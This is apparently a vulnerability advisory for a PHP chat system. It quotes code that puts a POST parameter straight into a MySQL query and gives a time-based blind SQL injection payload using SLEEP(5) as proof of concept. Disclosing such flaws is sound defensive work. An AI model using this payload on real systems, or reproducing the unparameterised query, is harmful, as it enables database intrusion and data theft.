# Chat System Using PHP has sql injection in /user/confirm_password.php



## supplier



https://code-projects.org/chat-system-using-php-source-code/



## Vulnerability file



/user/confirm_password.php



## describe


The cid parameter in /user/confirm_password.php is not properly sanitized or parameterized, which leaves it vulnerable to SQL injection attacks. Attackers can exploit this by injecting malicious SQL code to manipulate the database queries. Utilizing time-based SQL injection methods, they can introduce intentional delays in the database response through functions such as SLEEP(). This technique can be employed to verify the existence of the vulnerability and may also be used to extract sensitive information from the database.



## **Code analysis**



```php
<?php
	include('session.php');
	
	$cid=$_POST['chatid'];
	$pass=$_POST['chat_pass'];
	
	$query=mysqli_query($conn,"select * from chatroom where chatroomid='$cid'");
	$row=mysqli_fetch_array($query);
	
	if ($row['chat_password']==$pass){
		mysqli_query($conn,"insert into chat_member (chatroomid, userid) values ('$cid', '".$_SESSION['id']."')");
		header('location: chatroom.php?id='.$cid);
	}
	
	else{
		?>
		<script>
			window.alert('Incorrect Password!');
			window.history.back();
		</script>
		<?php
	}

?>
```

Inserting $_POST['chatid'] into Mysql query without any filter. A time-based blind SQL injection can be triggered.





## POC

```
cid=1' AND (SELECT 1003 FROM (SELECT(SLEEP(5)))bYhJ) AND 'VosV'='VosV
```

Send this request, you can observe an additional 5 seconds time delay triggered by the time-based injection.
